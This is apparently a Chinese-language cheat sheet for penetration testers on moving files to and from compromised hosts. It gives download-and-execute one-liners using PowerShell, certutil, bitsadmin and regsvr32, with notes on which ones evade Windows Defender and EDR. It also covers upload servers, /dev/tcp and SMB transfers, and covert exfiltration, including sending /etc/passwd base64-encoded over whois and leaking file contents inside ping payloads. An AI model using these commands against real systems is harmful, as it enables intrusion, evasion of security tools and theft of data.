开启HTTP服务

以下默认把命令行所在目录当作映射目录

python3.X：

python -m http.server 8080


PHP：

php -S localhost:8080 [可选，若添加xx.php，则映射特定文件]


从HTTP下载文件（以下所有命令都是在cmd/终端执行，包括awk）

Windows（可以同时执行）

powershell:

powershell (new-object system.net.webclient).downloadfile('http://192.168.206.1/1.bat','d:/2.bat');start-process 'd:/2.bat'

经验：1.没管理员权限不要把文件写c盘，会报错但没提示权限问题，让你不知道错哪里；2.不建议一次性执行，后面打开文件的命令会不灵3.windows defender不会警报，某EDR会（只要打开powershell），但是过了一分钟不阻止执行会自动通过


certutil

certutil -urlcache -split -f http://192.168.206.1/1.bat 2.bat && 2.bat

经验：1.不需要管理员权限，如果遇到只有c盘的主机且没有权限，可以用这个2.太骚了，这命令，EDR都过了，结果被windows defender拦了


bitsadmin

bitsadmin /transfer n http://192.168.206.1/1.bat d:\2.bat && d:\2.bat

经验：1.后面地址是\号，不能变，否则会报参数错误2.这条命令我愿称之为天降猛男，能过EDR和windows defender3.它的下载速度比较慢


regsvr32

regsvr32 /u /s /i:http://192.168.206.1/xxx scrobj.dll

经验：1.能过EDR，不能过windows defender 2.网址是有关COM组件文件的，想要测试，可以在msf上search regsvr32_command_delivery_server，配置好会自动返回上面的payload

awk

awk 'BEGIN {  RS = ORS = "\r\n"  HTTPCon = "/inet/tcp/0/127.0.0.1/1337"  print "GET /secret.txt HTTP/1.1\r\nConnection: close\r\n"    |& HTTPCon  while (HTTPCon |& getline > 0)      print $0  close(HTTPCon)}'

搭建 HTTP PUT服务

mkdir -p /var/www/upload/ # 创建目录 chown www-data:www-data /var/www/upload/ # 修改目录所属用户和组cd /etc/nginx/sites-available # 进入 nginx 虚拟主机目录
# 写入配置到 file_upload 文件cat <<EOF > file_uploadserver {    listen 8001 default_server;    server_name kali;        location / {        root /var/www/upload;        dav_methods PUT;    }}EOF# 写入完毕cd ../sites-enabled # 进入 nginx 虚拟主机启动目录ln -s /etc/nginx/sites-available/file_upload file_upload # 启用 file_upload 虚拟主机systemctl start nginx # 启动 Nginx

经验：1.如果服务器是centos，不建议用这个，因为少了sites-enabled，需要额外配置一些东西，但是我按网上的配置完，结果nginx启动出错


Python2.X

import sysimport signalfrom threading import Threadfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler


class PUTHandler(BaseHTTPRequestHandler):    def do_PUT(self):        length = int(self.headers['Content-Length'])        content = self.rfile.read(length)        self.send_response(200)        with open(self.path[1:], "w") as f:            f.write(content)

def run_on(port):    print("Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...".format(sys.argv[1], port))    server_address = (sys.argv[1], port)    httpd = HTTPServer(server_address, PUTHandler)    httpd.serve_forever()

if __name__ == "__main__":    if len(sys.argv) < 3:        print("Usage:\n\tpython {0} ip 1337".format(sys.argv[0]))        sys.exit(1)    ports = [int(arg) for arg in sys.argv[2:]]    try:        for port_number in ports:            server = Thread(target=run_on, args=[port_number])            server.daemon = True # Do not make us wait for you to exit        server.start()        signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt    except KeyboardInterrupt:        print "\nPython HTTP PUT Server Stoped."        sys.exit(1)
启动示例：python put.py ip port

经验：1.建议不要在window上用 ，因为signal.pause()用不了，当然你可以替换成my_queue.get(True, averylongtime) 应该可以,2.BaseHTTPServer是python2的，如果是Python3，我看网上说被替换成http.server，但是我失败了，HTTP PUT并没有开启

linux

用Bash /dev/tcp传输文件

接收者

nc -lvnp 2333 > test.txt

发送者

cat test.txt > /dev/tcp/192.168.206.140/2333


搭建SMB服务传输文件

接收者（kali自带此命令）

impacket-smbserver aptwhois `pwd`

经验：1.aptwhois是自拟的共享名，`pwd`是使用当前路径的意思，你也可以改成/home/等其他路径


发送者

net use x: \\192.168.206.140\aptwhoiscopy test.txt x:net use x: \del


whois数据传输

接收者

nc -lvnp 2333 | sed "s/ //g" | base64 -d

发送者

whois -h 192.168.206.140 -p 2333 `cat /etc/passwd | base64`

经验：1.whois不是系统自带命令，要额外下载


ping命令文件传输

发送者

xxd -p -c 4 test.txt | while read line; do ping -c 1 -p $line 192.168.206.1; done
